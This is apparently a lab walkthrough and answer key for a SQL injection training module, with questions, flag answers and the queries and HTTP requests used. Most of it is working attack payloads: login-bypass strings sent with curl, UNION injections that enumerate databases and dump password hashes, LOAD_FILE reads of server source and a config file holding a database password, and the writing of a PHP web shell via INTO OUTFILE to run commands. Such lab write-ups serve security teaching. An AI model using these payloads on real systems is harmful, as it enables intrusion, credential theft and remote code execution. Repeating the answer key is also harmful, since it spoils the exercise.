1. Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?

- `employees`

```sh
mysql -u root -ppassword -h $IP -P port_number
SHOW DATABASES;
```

---

2. What is the department number for the 'Development' department?

- `d005`

```sql
USE departments;
SELECT * FROM departments;
```

---

3. What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?

```sh
mysql> SELECT * FROM employees WHERE first_name LIKE "Bar%" AND hire_date = "1990-01-01";

+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
+--------+------------+------------+-----------+--------+------------+
```

---

4.  In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?

```sql
SELECT COUNT(emp_no) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%Engineer%';
```

---

5.  Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?

```sh
curl $IP:$PORT -vvv -X POST -d "username=tom'OR'1=1&password="
```

---

6. Login as the user with the id 5 to get the flag.

- random input result like
```sql
SELECT * FROM logins WHERE (username='abc' AND id > 1) AND password = '350c9d901b7f1c73a481e240ec1b7c0b';
```
- to get id 5
```sql
SELECT * FROM logins WHERE (username='' OR id = 5) -- -' AND id > 1) AND password = 'some-encrypted-string';
```

> username -> `'OR id = 5) -- -`

```sh
❯ curl 167.99.89.94:31450 -vvv -X POST -d "username='OR id=5) -- -&password="
```

---

7. Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

```sh
mysql> SELECT * FROM employees UNION SELECT 1, 1, dept_no, dept_name, 1, 1 FROM
departments;
```

---

8. Use a Union injection to get the result of 'user()'

- In search box,
```
'  => get an error
'' => no error
' -- - => show all results

// check with ORDER BY 1,2,3,4, 
5 => error 
- contians 4 columns

// use UNION SELECT and test with
' UNION SELECT NULL,NULL,NULL,NULL --
' UNION SELECT 1,NULL,NULL,NULL --
' UNION SELECT 1,2,NULL,NULL --
- etc and find the location of response

' UNION SELECT 1,2,user(),4 --'
```

---

9. What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?

- in search box,
```sql
# test with above methods
# find db version
abc' UNION SELECT 1,2,@@version,4 -- -
# 	10.3.22-MariaDB-1ubuntu1

abc' UNION SELECT 1,2,3,schema_name FROM INFORMATION_SCHEMA.SCHEMATA -- -
# will get 5 dbs including dev, ilfreight

abc' UNION SELECT 1,2,table_name,table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='ilfreight' -- -
# get 3 tables' names - ports, products, users

abc' UNION SELECT 1,column_name,table_name,table_schema FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' -- -
# get 6 columns - username and password

abc' UNION SELECT 1,2,username,password FROM ilfreight.users -- -
# get 2 records -> admin, newuser and with their passwords
```

---

10. We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.

```sql
# test with above results

abc' UNION SELECT 1,2,3,USER() -- - // root@localhost
abc' UNION SELECT 1,2,3,super_priv FROM mysql.user WHERE user="root" -- - // Y
abc' UNION SELECT 1,2,grantee,privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES -- - // result many privilege_types including FILE

# find the source code of current file
abc' UNION SELECT 1,2,LOAD_FILE('/var/www/html/search.php'),4 -- -
```
- get 
```php
<?php
if (isset($_GET["port_code"])) {
$q = "Select * from ports where code like '%".$_GET["port_code"]."%'";

$result = mysqli_query($conn,$q);
if (!$result)
{
		die("</table></div><p style='font-size: 15px'>".mysqli_error($conn)."</p>");
}
while($row = mysqli_fetch_array($result))
  {
  echo "<tr><td style=\"width:400px\" colspan=3>".$row[1]."</td><td style=\"width:400px\" colspan=3>".$row[2]."</td><td style=\"width:450px\" colspan=3>".$row[3]."</tr>";
  }
}
?>
```
- $conn is not defined and it must be imported somewhere and find the `include` word and find that
```html
<tr><td style="width:400px" colspan=3>2</td><td style="width:400px" colspan=3><?php
include "config.php";
?>
```
- find the source code of config.php

```sql
abc' UNION SELECT 1,2,LOAD_FILE('/var/www/html/config.php'),4 -- -
```
- find that
```php
$config=array(
'DB_HOST'=>'localhost',
'DB_USERNAME'=>'root',
'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!',
'DB_DATABASE'=>'ilfreight'
);
```

---

11. Find the flag by using a webshell.

- test like above methods and see we have 
- then find security_file_priv with
```
GET /search.php?port_code=abc'+UNION+SELECT+1,variable_name,variable_value,2+FROM+information_schema.global_variables+WHERE+variable_name="secure_file_priv";--+- HTTP/1.1
```
- return no value and we can have write access
- write test file to common web root /var/www/html/test.txt
```
GET /search.php?port_code=abc'+UNION+SELECT+1,'file+written+successfully',3,4+INTO+OUTFILE+'/var/www/html/test.txt';--+- HTTP/1.1
```
- then find `/test.txt` and get the result
- write php file to interact with file system

```
GET /search.php?port_code=abc'+UNION+SELECT+1,'<?php+system($_REQUEST[0]);?>',3,4+INTO+OUTFILE+'/var/www/html/shell.php';--+- HTTP/1.1
```
- find the flag file
```
GET /shell.php?0=find+/+-name+"flag*"+2>/dev/null HTTP/1.1
```
- result `/var/www/flag.txt`

```
GET /shell.php?0=cat+/var/www/flag.txt HTTP/1.1
```
---
